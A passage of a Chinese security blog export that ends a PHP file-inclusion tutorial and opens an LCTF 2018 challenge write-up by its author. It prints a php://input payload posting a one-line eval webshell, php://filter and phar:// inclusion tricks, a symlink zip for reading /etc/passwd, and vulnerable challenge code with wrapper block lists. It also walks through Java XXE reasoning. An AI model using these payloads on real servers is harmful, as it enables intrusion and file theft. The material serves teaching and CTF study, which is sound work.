的特性了，当然部分伪协议，比如 php:&#x2F;&#x2F;input 你要用还是需要 allow_url_include 打开,<strong>data:&#x2F;&#x2F; 更是需要 php_url_fopen 和 php_uri_include 都打开</strong>（由于 data:&#x2F;&#x2F;输入远程文件包含的范畴，于是我在前面的部分已经提及了）</p><h5 id="1-php-input"><a href="#1-php-input" class="headerlink" title="1.php:&#x2F;&#x2F;input"></a><strong>1.php:&#x2F;&#x2F;input</strong></h5><p>php:&#x2F;&#x2F;input 是个可以访问请求的原始数据的只读流(这个原始数据指的是POST数据)</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/php%20input.png" alt="此处输入图片的描述"></p><p>当然了，我们也能利用这个来执行命令，上传我们的一句话，直接 getshell,上菜刀</p><pre><code class="hljs">http://localhost/qweasdzxc.php?rf=php://input</code></pre><p>POST :</p><pre><code class="hljs">&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&amp;cmd</code></pre><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/getshell.png" alt="此处输入图片的描述"></p><h5 id="3-phar"><a href="#3-phar" class="headerlink" title="3.phar:&#x2F;&#x2F;"></a><strong>3.phar:&#x2F;&#x2F;</strong></h5><p>这个协议是仿照 Java 中的打包协议 Jar 弄出来的，他的特点就是能将任意后缀名的压缩包解包，得到里面指定的内容，这个方法在绕过后缀名限定的包含中非常好用</p><p>包含方法：</p><pre><code class="hljs">phar://aaa.bbb/shell.php</code></pre><p>具体可看：<a href="http://www.91ri.org/13363.html">http://www.91ri.org/13363.html</a></p><p><strong>拓展知识：</strong></p><p>使用 phar:&#x2F;&#x2F; 扩展 php 反序列化攻击面</p><p><strong>链接：</strong></p><p><a href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a></p><h5 id="4-php-filter："><a href="#4-php-filter：" class="headerlink" title="4.php:&#x2F;&#x2F;filter："></a><strong>4.php:&#x2F;&#x2F;filter：</strong></h5><p>这个是一个过滤器，里面的过滤方法很多，我们如果不想执行被包含的代码，我们就可以使用base64 编码输出，通常用来读取源码</p><p>php:&#x2F;&#x2F;filter 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定</p><pre><code class="hljs">resource=&lt;要过滤的数据流&gt; 这个参数是必须的，且必须位于 php://filter 的末尾，并且指向需要过滤筛选的数据流。read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。write=&lt;写链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。&lt;；两个链的筛选列表&gt; 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 </code></pre><p>举两个最简单的例子：</p><p><strong>示例一：使用 php:&#x2F;&#x2F;filter&#x2F;read&#x3D;xxxx&#x2F;resource&#x3D;</strong></p><p><strong>测试代码：</strong></p><pre><code class="hljs">&lt;?phpif(array_key_exists(&quot;rf&quot;, $_GET))&#123;$page = $_GET[&#39;rf&#39;];if($page != &#39;&#39;)&#123;include($page);&#125;&#125;else&#123;echo &#39;&lt;script&gt;window.location.href = &quot;./qweasdzxc.php?rf=&quot;&lt;/script&gt;&#39;;&#125;?&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt;&lt;/head&gt; &lt;body&gt;&lt;center&gt;&lt;h2&gt;test page： rf=file_get_contents($input);&lt;/h2&gt;&lt;h3&gt;----delete this page when the test has finished----&lt;/h3&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><strong>实验截图：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/php%20filter%20read.png" alt="此处输入图片的描述"></p><blockquote><p><strong>注意点：</strong></p><p>(1)记住一旦使用了  read 选项，我们就值关心数据流的来源，这里的数据流的来源就是 resource<br>传入的，至于经过过滤器以后这个数据流要去哪里，这不是我们这个处理能决定的，还要依赖外部的函数<br>(2)我们的过滤是按照过滤器从左到右的顺序进行的，不要错误地认为是从右到左</p></blockquote><p><strong>示例二：使用 php:&#x2F;&#x2F;filter&#x2F;write&#x3D;xxxx&#x2F;resource&#x3D;</strong></p><p><strong>测试代码：</strong></p><pre><code class="hljs">&lt;?phpif(array_key_exists(&quot;rf&quot;, $_GET))&#123;$page = $_GET[&#39;rf&#39;];if($page != &#39;&#39;)&#123;file_put_contents($page,&quot;hello world&quot;);&#125;&#125;else&#123;echo &#39;&lt;script&gt;window.location.href = &quot;./qweasdzxc.php?rf=&quot;&lt;/script&gt;&#39;;&#125;?&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt;&lt;/head&gt; &lt;body&gt;&lt;center&gt;&lt;h2&gt;test page： rf=file_get_contents($input);&lt;/h2&gt;&lt;h3&gt;----delete this page when the test has finished----&lt;/h3&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><strong>实验截图：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/php%20filter%20write.png" alt="此处输入图片的描述"></p><blockquote><p><strong>注意点：</strong></p><p>(1)一旦使用了 write 选项，我们就只关系数据的输出，数据的输出就是我们指定的 resource<br>的文件，而数据的输入要靠外部的函数帮我们实现<br>(2)我们的过滤是按照过滤器从左到右的顺序进行的，不要错误地认为是从右到左</p></blockquote><p>P 总在 2016 年讲过一个知识点 利用 php:&#x2F;&#x2F;filter bypass 死亡 exit 的方法，文章链接如下，我就不详细分析了</p><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><p>但是这个方法的升级版也在 hitcon CTF 2018  One-line-php-challenge 中出现，这个方法是 Orange 的预期解法，可以看下面这个链接：</p><p> <a href="http://wonderkun.cc/index.html/?p=718">http://wonderkun.cc/index.html/?p=718</a></p><p><strong>那么有哪些过滤器呢？</strong></p><p>过滤器有很多种，有字符串过滤器、转换过滤器、压缩过滤器、加密过滤器</p><p><strong>(1)字符串过滤器</strong></p><pre><code class="hljs">string.rot13      进行rot13转换string.toupper    将字符全部大写string.tolower    将字符全部小写string.strip_tags 去除空字符、HTML 和 PHP 标记后的结果 </code></pre><p><strong>(2)转换过滤器</strong></p><pre><code class="hljs">convert.base64-encode  base64 编码convert.base64-decode  base64 解码convert.quoted-printable-encode  quoted-printable 编码（也是另一种将二进制进行编码的方案）convert.quoted-printable-decode  quoted-printable 解码convert.iconv 实现任意两种编码之间的转换</code></pre><p><strong>(3)压缩过滤器</strong></p><pre><code class="hljs">zlib.deflate 压缩过滤器zlib.inflate 解压过滤器bzip2.compress 压缩过滤器bzip2.decompress 解压过滤器</code></pre><p><strong>(4)加密过滤器</strong></p><pre><code class="hljs">mcrypt.*  加密过滤器mdecrypt.* 解密过滤器</code></pre><p><strong>一些实例：</strong></p><p>readfile(“php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;<a href="http://www.example.com/">http://www.example.com</a>“);<br>readfile(“php:&#x2F;&#x2F;filter&#x2F;read&#x3D;string.toupper&#x2F;resource&#x3D;<a href="http://www.example.com/">http://www.example.com</a>“);<br>readfile(“php:&#x2F;&#x2F;filter&#x2F;read&#x3D;string.toupper|string.rot13&#x2F;resource&#x3D;<a href="http://www.example.com/">http://www.example.com</a>“);<br>file_put_contents(“php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13&#x2F;resource&#x3D;example.txt”,”Hello World”);</p><p><strong>特别提一下这个过滤器convert.iconv</strong> </p><p>这个过滤器能实现几乎任意的两种编码之间的转化</p><pre><code class="hljs">php://filter/read=convert.iconv.UTF-8%2FASCII%2F%2FTRANSLIT/resource=...convert.iconv.ISO-8859-1/UTF-8php://filter/convert.iconv.UTF-8%2fUTF-7/resource=</code></pre><p><strong>实际案例：</strong></p><p><strong>(1) 案例一：</strong></p><p>国外的一个安全人员在一次 CTF 中发现，使用连续两种编码之间的转换能骗过 解析器误认为 flag 文件是 图片格式.可以看这个链接：<a href="https://gynvael.coldwind.pl/?lang=en&id=671">https://gynvael.coldwind.pl/?lang=en&amp;id=671</a></p><p><strong>(2) 案例二：</strong></p><p>hitcon CTF 2018 one-line-php-challenge wupco 师傅的非预期解法 writeup:<a href="https://hackmd.io/s/SkxOwAqiQ#">https://hackmd.io/s/SkxOwAqiQ#</a></p><h4 id="7-软链接文件包含绕过open-basedir"><a href="#7-软链接文件包含绕过open-basedir" class="headerlink" title="7.软链接文件包含绕过open_basedir"></a><strong>7.软链接文件包含绕过open_basedir</strong></h4><p>这个方法在不少漏洞中都出现过，比如 gitlab 的任意文件读取，在 CTF 中也出现过多次，具体的细节可以看<a href="https://xz.aliyun.com/t/2589">这篇文章</a>，或者看一下 HCTF2018 hide and seek 这道题，这道题也是利用了这种手法实现的任意文件读取</p><p>我们首先构造一个指向 &#x2F;etc&#x2F;passwd 的软链接文件，看看能不能成功</p><pre><code class="hljs">root@K0rz3n:~# ln -s /etc/passwd test</code></pre><p>看一下软链接的指向   </p><pre><code class="hljs">lrwxrwxrwx  1 root root     11 Nov 11 06:45 test -&gt; /etc/passwd</code></pre><p>现在我们把这个文件进行压缩</p><pre><code class="hljs">root@K0rz3n:~# zip -y test.zip test</code></pre><p>上传然后 submit </p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/HCTF2018%20hide_and_seek1.png" alt="此处输入图片的描述"></p><h2 id="0x04-如何防御："><a href="#0x04-如何防御：" class="headerlink" title="0x04 如何防御："></a><strong>0x04 如何防御：</strong></h2><p>1、无需情况下设置allow_url_include和allow_url_fopen为关闭</p><p>2、对可以包含的文件进行限制，可以使用<strong>白名单的方式</strong>，或者设置可以包含的目录，<strong>如open_basedir</strong></p><p>3、<strong>尽量不使用动态包含</strong></p><p>4、严格检查变量是否已经初始化。</p><p>5、建议假定所有输入都是可疑的，尝试对所有输入提交可能可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查**，参数中不允许出现..&#x2F;之类的目录跳转符。**</p><p>6、严格检查include类的文件包含函数中的参数是否外界可控。</p><p>7、不要仅仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。</p><h2 id="0X05-参考："><a href="#0X05-参考：" class="headerlink" title="0X05 参考："></a><strong>0X05 参考：</strong></h2><p> <a href="https://www.anquanke.com/post/id/86123">https://www.anquanke.com/post/id/86123</a><br> <a href="https://www.jb51.net/article/141767.htm">https://www.jb51.net/article/141767.htm</a><br> <a href="http://www.am0s.com/penetration/131.html">http://www.am0s.com/penetration/131.html</a><br> <a href="https://www.thinksaas.cn/group/topic/662092/">https://www.thinksaas.cn/group/topic/662092/</a><br> <a href="http://www.cnblogs.com/littlehann/p/3665062.html">http://www.cnblogs.com/littlehann/p/3665062.html</a><br> <a href="http://www.91ri.org/13363.html">http://www.91ri.org/13363.html</a><br> <a href="http://www.freebuf.com/column/148886.html">http://www.freebuf.com/column/148886.html</a><br> <a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a><br> <a href="http://skysec.top/2018/04/04/amazing-phpinfo/">http://skysec.top/2018/04/04/amazing-phpinfo/</a><br> <a href="https://xz.aliyun.com/t/2148">https://xz.aliyun.com/t/2148</a><br> <a href="https://www.jianshu.com/p/051a87f45222?utm_campaign=maleskine&utm_content=note&utm_medium=reader_share&utm_source=weixin">https://www.jianshu.com/p/051a87f45222?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=reader_share&amp;utm_source=weixin</a><br> <a href="http://php.net/manual/zh/session.upload-progress.php">http://php.net/manual/zh/session.upload-progress.php</a><br> <a href="http://wonderkun.cc/index.html/?p=718">http://wonderkun.cc/index.html/?p=718</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web安全 漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LCTF 2018 T4lk 1s ch34p,sh0w m3 the sh31l 详细分析</title>
    <link href="/2018/11/19/LCTF%202018%20T4lk%201s%20ch34p,sh0w%20m3%20the%20sh31l%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/"/>
    <url>/2018/11/19/LCTF%202018%20T4lk%201s%20ch34p,sh0w%20m3%20the%20sh31l%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="0X00-两道题两个非预期"><a href="#0X00-两道题两个非预期" class="headerlink" title="0X00 两道题两个非预期"></a><strong>0X00 两道题两个非预期</strong></h2><p>本来就出了这一道题，PHP 代码是用 orange 的改的，我本想设计一个不可上传，但是路径可知的目录，然后利用 java 的 xxe 实现文件上传，再利用 move 移动到那个已知的路径，通过反序列化临时文件来触发已知路径中的文件包含 getshell,但是由于我自己对orange 代码中沙盒的理解的不到位，导致了这道题彻底的非预期，后来我干脆删除了 java 的部分，因为师傅们发现 data 目录其实在 cookie 中能得到，而我在反序列化的时候也没有限制 data 目录的反序列化，并且上传的文件可控，那这样就直接能 getshell， 第二题虽然我限制了不能反序列化 data 目录下面的文件，但是由于我自己写 read_secret 时候的失误导致了另一个非预期，read_secret 本来应该是一个 shell 脚本，但我写成了一个字符串，返回值是 Null ,所以 cookie 中的 hmac 签名不攻自破，路径也就可以伪造，然后利用这种方法 getshell ,但是实际上这个两个题的代码就差了过滤 data 和 .. 的正则，还有一点像吐槽的就是我那个评论框真的是因为人性化做的不好，似乎人们都觉得那个是假的似的，那我下面的主要分析就按照我一开始的想法分析了。</p><span id="more"></span><h2 id="0X01-说一下想要考察的点"><a href="#0X01-说一下想要考察的点" class="headerlink" title="0X01 说一下想要考察的点"></a><strong>0X01 说一下想要考察的点</strong></h2><p>LCTF2018 我出的这道题主要考察了两个知识点，一个就是当前最最最最，最火的 Phar 反序列化，另一个就是前一段时间比较众人皆知的 java 的 XXE 漏洞，毕竟微信的洞谁能不知道呢？虽然是大家比较熟悉的洞，但是我依然进行了比较深入的挖掘，考察的是比较容易被忽视的点，当然为了将这个两个点结合起来我也是花了非常大的功夫(如果说有脑洞其实我是不承认的，我承认的是由于将两者结合起来，利用的过程的确非常复杂)，那么接下来就让我好好的分析一下这道题，看看它能给我们带来什么样的头脑风暴</p><h2 id="0X02-题目概览"><a href="#0X02-题目概览" class="headerlink" title="0X02 题目概览"></a><strong>0X02 题目概览</strong></h2><h3 id="1-题目描述如图所示："><a href="#1-题目描述如图所示：" class="headerlink" title="1.题目描述如图所示："></a><strong>1.题目描述如图所示：</strong></h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF_show_me_the_shell_.gif" alt="此处输入图片的描述">  </p><p>hh,这一部分的动态前端就是为了活跃气氛的(其实为了动态也写了我挺长时间)，当然也有一点提示，就是说下面有一个评论框可以写，说明这个东西是题目中的关键要素。点击标题就能看到正式的题目了</p><h3 id="2-题目代码如下："><a href="#2-题目代码如下：" class="headerlink" title="2.题目代码如下："></a><strong>2.题目代码如下：</strong></h3><pre><code class="hljs">&lt;?php$SECRET  = `../read_secret`;                                  $SANDBOX = &quot;../data/&quot; . md5($SECRET. $_SERVER[&quot;REMOTE_ADDR&quot;]);$FILEBOX = &quot;../file/&quot; . md5(&quot;K0rz3n&quot;. $_SERVER[&quot;REMOTE_ADDR&quot;]);   @mkdir($SANDBOX);@mkdir($FILEBOX);if (!isset($_COOKIE[&quot;session-data&quot;])) &#123;    $data = serialize(new User($SANDBOX));    $hmac = hash_hmac(&quot;md5&quot;, $data, $SECRET);    setcookie(&quot;session-data&quot;, sprintf(&quot;%s-----%s&quot;, $data, $hmac));      &#125;class User &#123;    public $avatar;    function __construct($path) &#123;        $this-&gt;avatar = $path;                                              &#125;&#125;class K0rz3n_secret_flag &#123;    protected $file_path;    function __destruct()&#123;        if(preg_match(&#39;/(log|etc|session|proc|read_secret|history|class|data|\.\.)/i&#39;, $this-&gt;file_path))&#123;            die(&quot;Sorry Sorry Sorry&quot;);        &#125;include_once($this-&gt;file_path); &#125;&#125;function check_session() &#123;    global $SECRET;    $data = $_COOKIE[&quot;session-data&quot;];    list($data, $hmac) = explode(&quot;-----&quot;, $data, 2);    if (!isset($data, $hmac) || !is_string($data) || !is_string($hmac))&#123;        die(&quot;Bye&quot;);    &#125;    if ( !hash_equals(hash_hmac(&quot;md5&quot;, $data, $SECRET), $hmac) )&#123;        die(&quot;Bye Bye&quot;);    &#125;    $data = unserialize($data);    if ( !isset($data-&gt;avatar) )&#123;        die(&quot;Bye Bye Bye&quot;);    &#125;    return $data-&gt;avatar;                                               &#125;function upload($path) &#123;    if(isset($_GET[&#39;url&#39;]))&#123;         if(preg_match(&#39;/^(http|https).*/i&#39;, $_GET[&#39;url&#39;]))&#123;            $data = file_get_contents($_GET[&quot;url&quot;] . &quot;/avatar.gif&quot;);                                                                                                 if (substr($data, 0, 6) !== &quot;GIF89a&quot;)&#123;                die(&quot;Fuck off&quot;);            &#125;            file_put_contents($path . &quot;/avatar.gif&quot;, $data);            die(&quot;Upload OK&quot;);        &#125;else&#123;            die(&quot;Hacker&quot;);        &#125;               &#125;else&#123;        die(&quot;Miss the URL~~&quot;);    &#125;&#125;function show($path) &#123;    if ( !is_dir($path) || !file_exists($path . &quot;/avatar.gif&quot;)) &#123;                   $path = &quot;/var/www&quot;;    &#125;    header(&quot;Content-Type: image/gif&quot;);    die(file_get_contents($path . &quot;/avatar.gif&quot;));                     &#125;function check($path)&#123;    if(isset($_GET[&#39;c&#39;]))&#123;        if(preg_match(&#39;/^(ftp|php|zlib|data|glob|phar|ssh2|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i&#39;,$_GET[&#39;c&#39;]))&#123;            die(&quot;Hacker Hacker Hacker&quot;);        &#125;else&#123;            $file_path = $_GET[&#39;c&#39;];            list($width, $height, $type) = @getimagesize($file_path);            die(&quot;Width is ：&quot; . $width.&quot; px&lt;br&gt;&quot; .                &quot;Height is ：&quot; . $height.&quot; px&lt;br&gt;&quot;);        &#125;    &#125;else&#123;        list($width, $height, $type) = @getimagesize($path.&quot;/avatar.gif&quot;);        die(&quot;Width is ：&quot; . $width.&quot; px&lt;br&gt;&quot; .            &quot;Height is ：&quot; . $height.&quot; px&lt;br&gt;&quot;);    &#125;&#125;function move($source_path,$dest_name)&#123;    global $FILEBOX;    $dest_path = $FILEBOX . &quot;/&quot; . $dest_name;    if(preg_match(&#39;/(log|etc|session|proc|root|secret|www|history|file|\.\.|ftp|php|phar|zlib|data|glob|ssh2|rar|ogg|expect|http|https)/i&#39;,$source_path))&#123;        die(&quot;Hacker Hacker Hacker&quot;);    &#125;else&#123;        if(copy($source_path,$dest_path))&#123;            die(&quot;Successful copy&quot;);        &#125;else&#123;            die(&quot;Copy failed&quot;);        &#125;    &#125;&#125;$mode = $_GET[&quot;m&quot;];if ($mode == &quot;upload&quot;)&#123;     upload(check_session());&#125;else if ($mode == &quot;show&quot;)&#123;    show(check_session());&#125;else if ($mode == &quot;check&quot;)&#123;    check(check_session());&#125;else if($mode == &quot;move&quot;)&#123;    move($_GET[&#39;source&#39;],$_GET[&#39;dest&#39;]);&#125;else&#123;        highlight_file(__FILE__);    &#125;include(&quot;./comments.html&quot;);</code></pre><p>有没有觉得似曾相识？没错这一部分是改编自 hitcon 2017 Orange 的 Phar 反序列化（当然我的出题的目的也是考察 Phar 的反序列化），简单的浏览一下代码，对比之前 Orange 的原题，我们发现这里做出了比较大的改动有三处，</p><h4 id="改动一"><a href="#改动一" class="headerlink" title="改动一:"></a><strong>改动一:</strong></h4><p>我改变了 getflag 的方式，看类名就知道，我这里很明确地要求你反序列化的是下面这个类的对象</p><pre><code class="hljs">class K0rz3n_secret_flag &#123;    protected $file_path;    function __destruct()&#123;        if(preg_match(&#39;/(log|etc|session|proc|read_secret|history|class|data|\.\.)/i&#39;, $this-&gt;file_path))&#123;            die(&quot;Sorry Sorry Sorry&quot;);        &#125;include_once($this-&gt;file_path); &#125;&#125;</code></pre><p>也就是说，我们只要构造好这个对象的属性让他的值为我们可以控制的文件，对其进行反序列化的时候我们能成功实现文件包含然后 getshell(题目已经说了是要 getshell 这里就不用考虑去包含 flag 文件了)</p><h4 id="改动二："><a href="#改动二：" class="headerlink" title="改动二："></a><strong>改动二：</strong></h4><p>我在原先的 upload 方法中添加了 协议的过滤</p><pre><code class="hljs">function upload($path) &#123;    if(isset($_GET[&#39;url&#39;]))&#123;         if(preg_match(&#39;/^(http|https).*/i&#39;, $_GET[&#39;url&#39;]))&#123;            $data = file_get_contents($_GET[&quot;url&quot;] . &quot;/avatar.gif&quot;);                                                                                                 if (substr($data, 0, 6) !== &quot;GIF89a&quot;)&#123;                die(&quot;Fuck off&quot;);            &#125;            file_put_contents($path . &quot;/avatar.gif&quot;, $data);            die(&quot;Upload OK&quot;);        &#125;else&#123;            die(&quot;Hacker&quot;);        &#125;               &#125;else&#123;        die(&quot;Miss the URL~~&quot;);    &#125;&#125; </code></pre><p>可以看到我只允许你使用 https 或者 http 协议进行文件的上传，我将原来能反序列化的点抹去了，很明显我的意思是不能再使用这个 file_get_contents 进行反序列化</p><h4 id="改动三："><a href="#改动三：" class="headerlink" title="改动三："></a><strong>改动三：</strong></h4><p>我新增了两个有意思的方法，check 和 move ，很明显，这两个方法是有问题的，利用点也肯定在这里</p><h5 id="1-check"><a href="#1-check" class="headerlink" title="1.check"></a><strong>1.check</strong></h5><p>check 的作用就是根据你提供的 URL  地址给出图片的大小，这里很明显是一个可控制点，能让我们输入自定义的路径(非常像 Orange 题目中的反序列化的点)，但是这个函数没有文件上传的功能，并且对传入的参数进行了一些过滤，把 phar:&#x2F;&#x2F; 开头的直接 Ban 了，也就是我要求你要用另外的反序列化的方式，这种方式不能使用 phar:&#x2F;&#x2F; 开头，我这里打算使用的是 compress.zlib:&#x2F;&#x2F;phar:&#x2F;&#x2F;xxxx 这种方式。</p><pre><code class="hljs">function check($path)&#123;    if(isset($_GET[&#39;c&#39;]))&#123;        if(preg_match(&#39;/^(ftp|php|zlib|data|glob|phar|ssh2|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i&#39;,$_GET[&#39;c&#39;]))&#123;            die(&quot;Hacker Hacker Hacker&quot;);        &#125;else&#123;            $file_path = $_GET[&#39;c&#39;];            list($width, $height, $type) = @getimagesize($file_path);            die(&quot;Width is ：&quot; . $width.&quot; px&lt;br&gt;&quot; .                &quot;Height is ：&quot; . $height.&quot; px&lt;br&gt;&quot;);        &#125;    &#125;else&#123;        list($width, $height, $type) = @getimagesize($path.&quot;/avatar.gif&quot;);        die(&quot;Width is ：&quot; . $width.&quot; px&lt;br&gt;&quot; .            &quot;Height is ：&quot; . $height.&quot; px&lt;br&gt;&quot;);    &#125;&#125;</code></pre><p>而且 我这里的利用的函数也不再是之前的简单的 file_get_contents 或者 is_file 再或者 is_dir 之类的，通过阅读zsx 大佬的博客，以及自己对 PHP 源码的分析，我最终选择了 getimagesize(） 这个函数去代替 file_get_contents 进行反序列化。</p><h5 id="2-move"><a href="#2-move" class="headerlink" title="2.move"></a><strong>2.move</strong></h5><p>这个函数就更可疑了，他能把一个确定的文件通过 copy 转移到我们自己的一个已知的目录下(我这里设计了两个目录，data 和 file 并且 data 目录下面的子目录我们是不知道目录的，但是 file 下面的目录名 我们却能知道)，并且能自定义文件名，看到这里应该能联想到我们获取 flag 的方式就是文件包含，我们这里希望你能将你控制的文件通过这个函数弄到 file 目录下的你已知的自己的目录,并最终对其进行文件包含来达到 getshell 的目的。</p><pre><code class="hljs">function move($source_path,$dest_name)&#123;    global $FILEBOX;    $dest_path = $FILEBOX . &quot;/&quot; . $dest_name;    if(preg_match(&#39;/(log|etc|session|proc|root|secret|www|history|file|\.\.|ftp|php|phar|zlib|data|glob|ssh2|rar|ogg|expect|http|https)/i&#39;,$source_path))&#123;        die(&quot;Hacker Hacker Hacker&quot;);    &#125;else&#123;        if(copy($source_path,$dest_path))&#123;            die(&quot;Successful copy&quot;);        &#125;else&#123;            die(&quot;Copy failed&quot;);        &#125;    &#125;&#125;</code></pre><h3 id="3-发现的问题："><a href="#3-发现的问题：" class="headerlink" title="3.发现的问题："></a><strong>3.发现的问题：</strong></h3><p>按照上面的思路对代码进行简单的分析以后，似乎我们已经找到了大致的解决问题的途径，但是问题依然存在，我们需要一个文件上传点才能串起来我们的利用链，我们来列举一下目前已知的上传点。</p><p>(1) upload 函数上传的文件我们不知道路径，因为路径被 secret 加密了，这个上传点被 Pass ，我们无法利用<br>(2) 因为代码本身的 check 需要用到 allow_url_fopen 打开,于是 move 函数也就成了一个隐藏的文件上传点，但是能不能用呢？因为这里我过滤了常见的 wapper 和 http Https 协议，想从外界复制文件应该也是不可行的。<br><strong>(3)别忘了我们的评论框</strong></p><h2 id="0X03-深入研究"><a href="#0X03-深入研究" class="headerlink" title="0X03 深入研究"></a><strong>0X03 深入研究</strong></h2><h3 id="对评论框的详细分析"><a href="#对评论框的详细分析" class="headerlink" title="对评论框的详细分析"></a><strong>对评论框的详细分析</strong></h3><p>这个评论框是做什么的呢？其实到这里为止题目才刚刚开始，利用这个评论框进行文件的上传是这道题我要考察的重点，也是我个人认为这道题最难的地方，我们先来抓包看一下。</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20%E8%AF%84%E8%AE%BA%E6%A1%86_1.png" alt="此处输入图片的描述"></p><p>我们看到评论框输入的内容被转化成了 json 格式发往了相同服务器的一个 API ，端口是 8080 ，8080 是 tomcat 的默认端口，熟悉的同学应该猜的出来，这是我用 java 写的一个 api 接口，根据你输入的请求得到 json 格式的返回结果，很多人第一反应肯定是 xss 之类的，所以这里我对输入做了过滤</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20%E8%AF%84%E8%AE%BA%E6%A1%862.png" alt="此处输入图片的描述"></p><p>我直接把尖括号过滤了，当然还有一些常见的符合 xml 的内容，其实就是传达这里不能输入不规范的内容</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20%E8%AF%84%E8%AE%BA%E6%A1%86_3.png" alt="此处输入图片的描述"></p><p>如果你熟悉 XEE 的 实战，知道在现实中 XXE 一般出现在调用 API 的接口、传递 json 等地的话，你就会立刻反应过来这里的 json 接口完全有可能去解析客户端发来的 XML 数据，没错，为了模拟这种情况我就是用 Java 写了这样一个能解析 json 还能解析 XML 的接口,只要我们将传递过去的 content-type 修改成 application&#x2F;xml 就可以了，我们可以传一个 xml 格式的数据过去看看</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20%E8%AF%84%E8%AE%BA%E6%A1%86_4.png" alt="此处输入图片的描述"></p><p>可以看到我们传入的内容被成功解析并在 json 中完整的返回，只要能解析外部实体这其实就是一个很明显的 XXE 了，只不过是 Java 的而已，我们尝试传入实体，看卡有没有被过滤(过滤了 &amp; 就只能 OOB了)</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20%E8%AF%84%E8%AE%BA%E6%A1%865.png" alt="此处输入图片的描述"></p><p>成功解析，好了，是不是感觉柳暗花明，XXE 漏洞最基本的是干什么？列目录，正好我们试一下解析外部实体</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20%E8%AF%84%E8%AE%BA%E6%A1%86_6.png" alt="此处输入图片的描述"></p><p>你的内心一定是 mmp 的，其实我就知道你会用 file 列目录，想给你一个打击，于是特地把 file 过滤了，看一下我的源码</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018_%E8%AF%84%E8%AE%BA%E6%A1%867.png" alt="此处输入图片的描述"></p><p><strong>由于图片显示不完整，我贴出代码：</strong></p><pre><code class="hljs"> public String XmlRe(@RequestBody String data, HttpServletRequest request) throws Exception &#123;        if(Pattern.matches(&quot;(?i)(.|\\s)*(file|ftp|gopher|CDATA|read_secret|logs|log|conf|etc|session|proc|root|history|\\.\\.|data|class|bash|viminfo)(.|\\s)*&quot;,data))&#123;            return &quot;&#123;\&quot;status\&quot;:\&quot;Error\&quot;,\&quot;message\&quot;:\&quot;Hacker! Hacker! Hacker!\&quot;&#125;&quot;;        &#125;else&#123;            Map&lt;String,String&gt; test = xmlToMap(data);            return &quot;&#123;\&quot;status\&quot;:\&quot;Error\&quot;,\&quot;message\&quot;:\&quot;&quot;+ test +&quot;\&quot;&#125;&quot;;        &#125;    &#125;</code></pre><p>其实我不只是过滤了 file 协议，我们知道低版本的jdk 支持 gopher 协议，我防止思路跑偏直接过滤了，还有就是有些时候想看一写带有特殊字符的文件的话可能会用到 CDATA 结，为了能尽量少的暴露敏感文件我也过滤了，毕竟题目不是要你读文件用的。但是如果你看一下文档的话，就能发现， java 还支持一个 netdoc 协议，能完成列目录的功能。</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/LCTF2018%20%E8%AF%84%E8%AE%BA%E6%A1%868.png" alt="此处输入图片的描述"></p><p>很多人肯定去忙着找 flag ，其实我 flag 没有写在文件里，找到 flag 的唯一方式就是拿到 shell 然后执行全局搜索。</p><p>别忘了现在的当务之急就是找文件上传点，这里我考察的是一个比较少见也比较细节的东西，java 的 jar:&#x2F;&#x2F; 